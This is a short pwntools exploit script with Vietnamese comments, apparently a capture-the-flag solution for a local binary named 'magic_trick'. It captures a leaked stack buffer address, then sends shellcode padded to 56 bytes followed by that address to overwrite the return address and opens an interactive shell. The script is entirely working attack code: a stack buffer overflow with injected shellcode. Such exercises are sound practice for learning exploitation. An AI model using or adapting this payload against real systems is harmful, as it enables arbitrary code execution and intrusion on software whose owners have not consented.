from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

p = process('./magic_trick')  # hoặc remote nếu có

# Bước 1: đọc leak địa chỉ
p.recvuntil(b"The number is '")
leak = p.recvuntil(b"'.", drop=True)
buf_addr = int(leak, 16)
log.info(f"Leaked buf address: {hex(buf_addr)}")

# Bước 2: trả lời câu hỏi
p.sendlineafter(b">> ", b"n")  # hoặc 'y'

# Bước 3: tạo payload
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(56, b"A")  # 48 bytes buf + 8 bytes v9, i
payload += p64(buf_addr)            # overwrite return address

# Bước 4: gửi payload vào read()
p.send(payload)

p.interactive()
